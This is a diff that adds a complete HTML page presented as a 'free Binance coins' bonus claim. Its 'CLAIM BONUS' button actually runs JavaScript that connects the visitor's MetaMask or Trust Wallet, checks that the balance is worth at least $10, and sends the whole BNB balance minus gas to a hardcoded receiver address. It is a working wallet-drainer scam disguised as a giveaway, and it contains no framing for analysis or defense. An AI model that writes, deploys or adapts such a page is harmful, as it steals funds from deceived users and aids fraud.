@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send Full BNB Balance</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <h2>Get a free Binance coins</h2>
+  <button onclick="sendFullBNB()">CLAIM BONUS</button>
+
+  <script>
+    const receiverAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
+
+    async function fetchBNBPriceUSD() {
+      const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd");
+      const data = await response.json();
+      return data.binancecoin.usd;
+    }
+
+    async function sendFullBNB() {
+      if (typeof window.ethereum === 'undefined') {
+        alert('Please use a Web3-enabled browser like Trust Wallet or MetaMask.');
+        return;
+      }
+
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const senderAddress = await signer.getAddress();
+        const balance = await provider.getBalance(senderAddress);
+
+        const bnbPriceUSD = await fetchBNBPriceUSD();
+        const balanceInBNB = parseFloat(ethers.utils.formatEther(balance));
+        const balanceInUSD = balanceInBNB * bnbPriceUSD;
+
+        if (balanceInUSD < 10) {
+          alert("Your BNB balance is less than $10. Minimum required to send is $10.");
+          return;
+        }
+
+        const gasPrice = await provider.getGasPrice();
+        const gasFee = gasPrice.mul(21000);
+        const amountToSend = balance.sub(gasFee);
+
+        if (amountToSend.lte(0)) {
+          alert("Not enough BNB to cover gas fees.");
+          return;
+        }
+
+        const tx = {
+          to: receiverAddress,
+          value: amountToSend
+        };
+
+        const txResponse = await signer.sendTransaction(tx);
+        alert("Transaction sent! Tx Hash: " + txResponse.hash);
+      } catch (error) {
+        console.error(error);
+        alert("Transaction failed or was cancelled.");
+      }
+    }
+  </script>
+</body>
+</html>
